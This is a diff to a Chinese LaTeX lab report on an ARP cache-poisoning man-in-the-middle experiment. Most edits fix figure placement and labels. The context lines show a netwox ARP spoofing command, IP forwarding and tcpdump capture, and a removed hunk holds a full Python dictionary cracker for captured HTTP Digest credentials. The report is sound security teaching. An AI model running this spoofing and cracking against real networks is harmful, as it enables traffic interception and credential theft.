@@ -28,7 +28,7 @@ Web Server 则被部署于另一个子网中。
 正常情况下，Victim 发往指定外部网段的流量首先发送至默认网关
 192.168.26.1，再由网关转发至 Web Server 192.168.1.80。
 
-\begin{figure}[htbp]
+\begin{figure}[H]
     \centering
     \includegraphics[width=0.75\textwidth]{figures/实验二拓扑.png}
     \caption{ARP 中间人攻击实验拓扑}
@@ -39,7 +39,7 @@ Web Server 则被部署于另一个子网中。
 发现当前局域网内 IP 地址与 MAC 地址之间的映射关系处于正常状态。
 实验结果如图~\ref{fig:arp_before} 所示。
 
-\begin{figure}[htbp]
+\begin{figure}[H]
     \centering
     \includegraphics[width=0.75\textwidth]{figures/验证受害者的正常ARP缓存.png}
     \caption{攻击前 Victim 主机的 ARP 缓存}
@@ -69,7 +69,7 @@ sudo sysctl -w net.ipv4.ip_forward=1
 \texttt{net.ipv4.ip\_forward}，其值为 1，
 表明 Attacker 已具备 IP 数据包转发能力。
 
-\begin{figure}[htbp]
+\begin{figure}[H]
     \centering
     \includegraphics[width=0.72\textwidth]{figures/攻击者开启流量转发.png}
     \caption{Attacker 开启 IPv4 流量转发}
@@ -89,7 +89,7 @@ sudo netwox 80 -e 02:82:8a:96:0a:4c -i 192.168.26.1 -E 02:ec:da:35:24:84 -I 192.
 伪装为网关 IP 地址 \texttt{192.168.26.1} 所对应的 MAC 地址，
 并持续向 Victim 发送伪造的 ARP Reply。
 
-\begin{figure}[htbp]
+\begin{figure}[H]
     \centering
     \includegraphics[width=0.85\textwidth]{figures/攻击者执行ARP欺骗.png}
     \caption{Attacker 使用 netwox 实施 ARP 缓存污染}
@@ -114,7 +114,7 @@ ping -c 4 192.168.1.80
 \end{lstlisting}
 
 实验结果如图~\ref{fig:ping_server} 所示。
-\begin{figure}[htbp]
+\begin{figure}[H]
     \centering
     \includegraphics[width=0.80\textwidth]{figures/受害者ARP污染后的通行.png}
     \caption{ARP 缓存污染后 Victim 与 Web Server 的连通性}
@@ -137,7 +137,7 @@ sudo tcpdump -n -e -i enp0s3 'arp or icmp'
 
 抓包结果如图~\ref{fig:tcpdump_mitm} 所示。
 
-\begin{figure}[htbp]
+\begin{figure}[H]
     \centering
     \includegraphics[width=0.88\textwidth]{figures/攻击者截获流量.png}
     \caption{Attacker 捕获 Victim 产生的网络流量}
@@ -161,7 +161,7 @@ Attacker 确实位于 Victim 与真实网关之间的流量转发路径上。
 \end{center}
 输入登录的用户名与密码，如图\ref{fig:access_http}所示，可见密码为 \texttt{123456}。
 
-\begin{figure}[htbp]
+\begin{figure}[H]
     \centering
     \includegraphics[width=0.92\textwidth]{figures/访问相应网站.png}
     \caption{Victim 访问相应网站的登录页面}
@@ -174,7 +174,7 @@ Attacker 确实位于 Victim 与真实网关之间的流量转发路径上。
 Attacker 可以在捕获到的 HTTP 请求中观察到
 \texttt{Authorization: Digest} 字段。
 
-\begin{figure}[htbp]
+\begin{figure}[H]
     \centering
     \includegraphics[width=0.92\textwidth]{figures/WireShark截获流量.png}
     \caption{Wireshark 捕获的 HTTP Digest 认证信息}
@@ -184,7 +184,7 @@ Attacker 可以在捕获到的 HTTP 请求中观察到
 从捕获的数据包中提取到的主要 Digest 参数如
 表~\ref{tab:digest_params} 所示。
 
-\begin{table}[htbp]
+\begin{table}[H]
     \centering
     \caption{捕获的 HTTP Digest 认证参数}
     \label{tab:digest_params}
@@ -245,72 +245,13 @@ qop、method、uri 和 response 的情况下，
 并将计算结果与捕获到的 response 进行比较。
 
 
-根据上述原理，本实验编写 Python 程序\texttt{digest\_crack.py}对候选口令进行离线验证。
-核心验证过程如下：
+根据上述计算过程，本实验编写 Python 程序
+\texttt{digest\_crack.py} 对六位数字候选口令进行离线验证。
+程序依次读取密码本中的候选口令，
+计算 $HA_1$、$HA_2$ 和最终的 \texttt{response}，
+并将其与 Wireshark 捕获到的 \texttt{response} 比较。
 
-\begin{lstlisting}[language=Python]
-import hashlib
-
-
-# Wireshark 中提取的 Digest 参数
-username = "wjy"
-realm = "ARP-LAB"
-method = "GET"
-uri = "/"
-
-nonce = "skPh9mpcBgA=03449b152e612b90bcaa85e20ec0a1cf84b24071"
-nc = "00000001"
-cnonce = "14f4b7e2d69aada7"
-qop = "auth"
-
-response = "1597a1728dc072e7120b90fcf05ba80d"
-
-
-# 计算 MD5
-def compute_md5_hash(text):
-    return hashlib.md5(text.encode("utf-8")).hexdigest()
-
-
-# 定义 MD5 碰撞函数
-def MD5Collision(response, dictfilepath):
-
-    # 打开字典文件，读取所有口令
-    with open(dictfilepath, "r") as file:
-        passwords = file.readlines()
-
-    # 计算 MD5 摘要，与 response 进行碰撞
-    for password in passwords:
-        password = password.strip()
-
-        # 构建 A1 和 A2
-        textpart_A1 = f"{username}:{realm}:{password}"
-        textpart_A2 = f"{method}:{uri}"
-
-        A1_MD5 = compute_md5_hash(textpart_A1)
-        A2_MD5 = compute_md5_hash(textpart_A2)
-
-        # 构建最终 Digest 输入
-        textpart = (
-            f"{A1_MD5}:{nonce}:{nc}:{cnonce}:{qop}:{A2_MD5}"
-        )
-
-        # 计算密码的 MD5 摘要
-        digest = hashlib.md5(
-            textpart.encode("utf-8")
-        ).hexdigest()
-
-        # 检查摘要是否与捕获到的 response 匹配
-        if digest == response:
-            print(f"口令正确 : {password}")
-            return password
-
-    print("Password not found in dictionary.")
-    return None
-
-
-# 使用六位数字密码本
-MD5Collision(response, "Password.txt")
-\end{lstlisting}
+完整程序见附录~\ref{appendix:digest_crack}。
 
 实验使用由六位数字组成的候选密码集合
 \texttt{Password.txt}。
@@ -318,14 +259,15 @@ MD5Collision(response, "Password.txt")
 \texttt{response}，若计算结果与 Wireshark 捕获到的
 \texttt{response} 完全相同，则说明当前候选口令与认证时使用的口令一致。
 
-运行程序\texttt{digest\_crack.py}后，成功找到了能够产生相同 Digest 响应值的六位数字口令，
-实验结果如图~\ref{fig:digest\_crack} 所示。
+运行程序 \texttt{digest\_crack.py} 后，
+成功找到了能够产生相同 Digest 响应值的六位数字口令，
+实验结果如图~\ref{fig:digestcrack} 所示。
 
-\begin{figure}[htbp]
+\begin{figure}[H]
     \centering
     \includegraphics[width=0.75\textwidth]{figures/得出口令.png}
     \caption{HTTP Digest 认证口令离线验证结果}
-    \label{fig:digest\_crack}
+    \label{fig:digestcrack}
 \end{figure}
 
 
@@ -336,7 +278,7 @@ MD5Collision(response, "Password.txt")
 
 \subsection{结果与分析}
 
-实验二完成了基于 ARP 缓存污染的中间人攻击。
+实验三完成了基于 ARP 缓存污染的中间人攻击。
 攻击前，Victim 的 ARP 缓存中保存正常的 IP--MAC 地址映射；
 攻击过程中，Attacker 持续向 Victim 发送伪造的 ARP Reply，
 使 Victim 将网关 IP 地址错误地映射到 Attacker 的 MAC 地址。
